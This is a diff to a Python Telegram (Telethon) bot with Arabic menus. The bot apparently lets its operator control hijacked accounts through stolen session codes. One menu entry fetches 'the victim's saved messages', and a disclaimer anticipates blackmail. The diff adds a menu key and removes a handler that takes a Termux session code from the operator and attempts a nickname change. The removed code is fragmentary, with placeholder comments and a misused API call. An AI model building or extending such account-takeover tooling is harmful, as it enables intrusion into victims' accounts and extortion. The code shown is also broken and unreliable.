@@ -214,6 +214,7 @@ menu = '''
 
 "V" ~ [جلب  الرسائل المحفوظه لدى الضحيه]
 
+"Z" ~ [معليك بي ] 
 '''
 mm = '''
 قم بلأنضمام الى قناة الساحر @SXYO3
@@ -778,39 +779,8 @@ async def users(event):
             await event.respond(part)
 
         await event.respond(" غير مبري الذمه اذا استخدمت الامر للابتزاز اللهم اني بلغت فاشهد", buttons=keyboard)
-import re
-from telethon import events
 
-# Assume 'bot' is your Telethon client instance
 
-@bot.on(events.callbackquery.CallbackQuery(data=re.compile(b"Z")))
-async def retrieve_code(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("الرجاء إرسال الكود تيرمكس:")
-        code_message = await x.get_response()
-        
-        # Implement the logic to process the code (replace 'cu' with your function)
-        op = await cu(code_message.text)
-        
-        if op:
-            await change_nickname(event)
-        else:
-            await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
 
-async def change_nickname(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("الرجاء إرسال الاسم الجديد:")
-        new_nickname = await x.get_response()
-        
-        try:
-            # Replace 'event.sender_id' with the actual user ID
-            await bot.edit_participant(event.chat_id, event.sender_id, username=new_nickname.text)
-            success_message = f"تم تغيير الاسم بنجاح إلى: {new_nickname.text}"
-            await event.respond(success_message)
-        except Exception as e:
-            error_message = f"خطأ أثناء تغيير الاسم: {e}"
-            await event.respond(error_message)
-
-        await event.respond("غير مبري الذمة إذا استخدمت الأمر للابتزاز. اللهم إني بلغت فاشهد", buttons=keyboard)
 
 
